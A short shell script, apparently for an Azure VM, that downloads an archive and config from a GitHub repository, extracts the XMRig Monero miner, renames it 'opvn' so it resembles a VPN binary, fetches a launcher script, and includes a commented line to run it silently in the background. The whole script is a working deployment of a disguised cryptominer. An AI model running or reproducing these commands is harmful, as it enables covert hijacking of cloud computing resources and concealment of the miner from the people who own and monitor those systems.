cd /home/azureuser
wget https://github.com/bondbenz1821/opme/raw/main/opme.tar.gz
tar -xzsf opme.tar.gz
mv xmrig* opvn
cd opvn
mv xmr* opvn

mv config.json config.json.bk
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/opvn.sh
chmod +x opvn.sh

#nohup sh opvn.sh > result.log 2>&1 &
